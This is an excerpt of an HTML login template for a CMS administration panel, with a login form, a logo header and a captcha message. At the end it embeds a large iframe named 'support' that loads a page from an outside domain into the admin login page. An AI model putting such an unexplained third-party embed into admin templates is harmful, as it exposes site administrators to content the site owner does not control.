...
<html xmlns="http://www.w3.org/1999/xhtml" lang="[(lang_code)]" xml:lang="[(lang_code)]">
	<head>
		...
		<style type="text/css">
			...
			.logo span{vertical-align: middle;color:#000}
			.logo img{
				border: 0 none;
				margin: 0 17px 0 0;
	...
	<body id="login">
		<div id="mx_loginbox">
			<form method="post" name="loginfrm" id="loginfrm" action="processors/login.processor.php">
				...
				<div class="sectionHeader">
					<a class="logo" href="../" target='_blank' title="Перейти на сайт >>>">
						<span style='display: block;font-weight: bold;font-size: 20px;margin: 12px 0 9px 0;padding: 10px;background: #fff;border: 2px solid #ddd;width: 621px;color:#666;'>
							<img src="[(site_url)]favicon.ico"> [+site_name+]
						</span>
					</a>
				</div>
				<div class="sectionBody">
					...
					<p class="caption" style='margin:0;'>[+login_captcha_message+]</p>
		...
		<iframe name='support' align='center' height='650px' width='900px' src='//web-kirov.ru/abvgd' style='margin:20px auto 20px auto;border:none;display:block;position:relative;z-index:10;'></iframe>
		<!-- close #mx_loginbox -->
